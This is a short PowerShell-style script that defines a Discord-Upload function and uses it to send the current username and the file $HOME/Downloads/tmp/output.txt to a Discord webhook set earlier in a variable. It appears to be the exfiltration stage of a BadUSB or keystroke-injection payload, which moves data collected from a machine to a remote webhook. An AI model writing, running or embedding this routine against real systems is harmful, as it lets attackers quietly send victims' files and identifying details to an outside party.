function Discord-Upload {
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $hookurl = "$dc"

    $Body = @{
        'username' = $env:USER
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))) {
        curl -X POST -H "Content-Type: application/json" -d (ConvertTo-Json $Body) $hookurl
    }

    if (-not ([string]::IsNullOrEmpty($file))) {
        curl -F "file1=@$file" $hookurl
    }
}

# Assuming you have set $dc earlier in the script
if (-not ([string]::IsNullOrEmpty($dc))) {
    Discord-Upload -file "$HOME/Downloads/tmp/output.txt"
}
